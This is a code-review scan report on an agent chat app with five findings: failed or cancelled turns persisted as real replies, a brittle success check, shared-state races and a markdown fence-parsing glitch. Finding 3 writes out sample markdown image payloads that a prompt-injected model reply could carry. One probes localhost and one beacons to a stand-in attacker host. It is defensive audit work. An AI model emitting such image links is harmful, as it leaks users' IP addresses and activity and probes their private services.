# Agent Chat — Combined Scan (ambiguity-guardian + bug-hunter)
> Context: agent-chat | Group: Persona & Agent Studio
> Total: 5 | Critical: 0 | High: 2 | Medium: 2 | Low: 1

## 1. Foreground chat finalize ignores terminal status — failed/cancelled turns are persisted as a real assistant answer (or silently vanish)
- **Severity**: High
- **Lens**: bug-hunter
- **Category**: silent failure / data integrity
- **File**: src/stores/slices/agents/chatSlice.ts:468-481 (status listener), :283-296 (finishChatStream); src/stores/slices/agents/executionSlice.ts:401 + :442-447 (finishExecution), :383-388 (cancelExecution finally)
- **Scenario**: A chat turn ends in a non-`completed` terminal state. (a) User clicks Cancel mid-stream → `cancelExecution`'s `finally` builds `fullResponse` from whatever text lines landed and calls `finishChatStream(...)`, persisting the truncated reply as a normal `assistant` message. (b) Execution reaches `failed`/`incomplete`/`cancelled`/`unknown` → both the chat status listener and `finishExecution` build `fullResponse` and finalize the same way. If partial text exists it is stored as a complete answer; if no `text`-classified line exists, `finishChatStream` early-returns at line 294 (`if (!fullResponse.trim()) return;`) after flipping `chatStreaming=false` — the thinking dots disappear and nothing else happens.
- **Root cause**: The terminal **status** is never consulted when finalizing the chat. `finishExecution(_status, …)` discards `_status`; the listener only checks `isTerminalState` (true for `failed`/`cancelled`/`incomplete`/`unknown`), not whether the turn *succeeded*. No path sets the chat-visible `error` field on failure.
- **Impact**: Cancelled/failed model output is recorded as an authoritative assistant reply (and then re-sent as conversation context / resumed via `--resume`), corrupting the conversation. Genuinely-failed turns with no text are swallowed with zero feedback — no error, no retry. Success theater.
- **Fix sketch**: Thread the terminal status into `finishChatStream`. Only persist an assistant message when `parseExecutionState(status) === 'completed'`; for `failed`/`cancelled`/`incomplete` set the slice `error` (surfaced by `ChatThread`'s error card + Retry) and do not persist partial text as a clean answer.
- **Value**: impact=7 effort=4

## 2. Background-chat success is decided by `status.includes("fail")` substring — incomplete/cancelled/unknown turns are reported as a real reply
- **Severity**: High
- **Lens**: bug-hunter
- **Category**: silent failure / wrong results
- **File**: src/stores/slices/agents/backgroundChatSlice.ts:378
- **Scenario**: `const succeeded = fullResponse.length > 0 && !terminalStatus.toLowerCase().includes("fail");`. Terminal states (per `executionState.ts`) are `completed | failed | incomplete | cancelled | unknown`. A `cancelled`, `incomplete`, or `unknown` execution that produced *any* text passes this check (none contain "fail"), so `succeeded=true`: a (possibly truncated) assistant reply is persisted, the row is marked `completed`, and a "`<persona>` replied to your feedback" OS + bell notification fires.
- **Root cause**: Brittle substring matching for status classification instead of the canonical state machine that the file already imports indirectly (`isTerminalState`). Only the literal substring "fail" counts as failure.
- **Impact**: Users are told the agent answered when it was cancelled/timed-out/truncated; the partial reply is persisted and later adopted + `--resume`d as if it were a complete answer, propagating corruption into the foreground thread. False-positive notifications erode trust.
- **Fix sketch**: Classify with the state enum: `const succeeded = parseExecutionState(terminalStatus) === 'completed' && fullResponse.length > 0;`. Treat every other terminal state as failed.
- **Value**: impact=7 effort=2

## 3. Untrusted model `img` URLs render unsanitized while `a` hrefs are sanitized — SSRF / tracking-pixel / IP leak
- **Severity**: Medium
- **Lens**: bug-hunter (security) / ambiguity-guardian (inconsistent policy)
- **Category**: adversarial input / SSRF
- **File**: src/features/agents/components/ChatMessageContent.tsx:194-196 (vs. sanitized `a` at :177-190)
- **Scenario**: A prompt-injected or malicious model response containing `![](http://127.0.0.1:PORT/...)` or `![x](http://attacker/track?u=...)` auto-loads on render. The `a` renderer routes `href` through `sanitizeExternalUrl`, but the `img` renderer passes `src` straight to `<img>`. In the Tauri webview this fires a GET to localhost/private-network services (port probing / CSRF-style side effects on the app's own local backend) and beacons that the user viewed the content (deanonymization / IP leak). Note: script-execution XSS is **not** reachable here — react-markdown renders no raw HTML (no `rehype-raw`), so the residual vector is the unsanitized URL, not `dangerouslySetInnerHTML`.
- **Root cause**: Inconsistent sanitization policy — link URLs are validated, image URLs are not, even though `sanitizeIconUrl` exists for exactly this (HTTPS-only, blocks private hosts + embedded credentials).
- **Impact**: Silent outbound requests to attacker- or model-chosen hosts including the loopback interface; privacy + SSRF surface from untrusted LLM output.
- **Fix sketch**: `const safeSrc = sanitizeIconUrl(src); if (!safeSrc) return null; return <img src={safeSrc} … loading="lazy" />;` and confirm the webview CSP constrains `img-src`.
- **Value**: impact=6 effort=2

## 4. Chat reuses the global execution buffer/binding — a chat send while another execution runs clobbers it
- **Severity**: Medium
- **Lens**: bug-hunter
- **Category**: race condition / shared-state corruption
- **File**: src/stores/slices/agents/chatSlice.ts:238 (`executionOutput: [], executionPersonaId, isExecuting, activeExecutionId`), :478, :497 (reset to null)
- **Scenario**: `sendChatMessage` writes the *shared* execution fields: `set({ … executionPersonaId, executionOutput: [], isExecuting: true })`, and on send sets `activeExecutionId`. These are the same globals the general execution system uses (`executionSlice`, `useExecutionStream`, `usePersonaExecution`). If a non-chat execution (Lab run, scheduled/background persona run) is already streaming, sending a chat message resets `executionOutput=[]` and rebinds `activeExecutionId`/`executionPersonaId` to the chat turn; on finalize the chat nulls `activeExecutionId`/`executionPersonaId` (:478/:497), pulling state out from under the other execution's live view and finalize logic.
- **Root cause**: The Chat tab doesn't mount `usePersonaExecution` and instead piggybacks on the single global execution buffer rather than an isolated per-execution slot (the background slice, by contrast, uses a local `outputLines` array).
- **Impact**: Concurrent non-chat execution loses its live output and may misattribute/lose its finalize; chat output can intermix with another run's lines that arrived before the reset.
- **Fix sketch**: Accumulate chat output in a listener-local array (as `setupBackgroundExecListeners` does) instead of the shared `executionOutput`, or guard the reset when `isExecuting` is already true for a different `activeExecutionId`.
- **Value**: impact=6 effort=5

## 5. `makeStreamSafe` fence-balancing miscounts 4-backtick / indented fences and drops the in-flight code body
- **Severity**: Low
- **Lens**: ambiguity-guardian
- **Category**: uncovered edge case / streaming render
- **File**: src/features/agents/components/ChatMessageContent.tsx:28-35
- **Scenario**: `(content.match(/^```/gm) ?? []).length` counts only lines starting with exactly ``` at column 0. A GFM 4-backtick fence (```` ```` ````, used to wrap code containing triple backticks) matches the first three chars and is miscounted; an indented fence inside a list item (`  ```js`) is not counted at all. Either skews the odd/even parity, so a balanced block is treated as open (or vice-versa). When judged "open", the code substitutes `content.slice(0, start) + '```\n```'`, discarding the partial body — the user sees an empty code box instead of code streaming in, or raw markdown flashes.
- **Root cause**: Fence detection is a naive line-prefix count that ignores fence length (3 vs 4+ backticks), indentation, and `~~~` fences; markdown fence rules are richer.
- **Impact**: Cosmetic-to-confusing streaming glitches (empty/raw code blocks) for replies containing nested or indented fenced code; no data loss (final non-streaming render is correct).
- **Fix sketch**: Track fence open/close with a small state pass that records fence length + indentation and only closes on a matching-or-longer marker; preserve and re-emit the partial body under a synthetic closing fence rather than replacing it with an empty block.
- **Value**: impact=3 effort=4
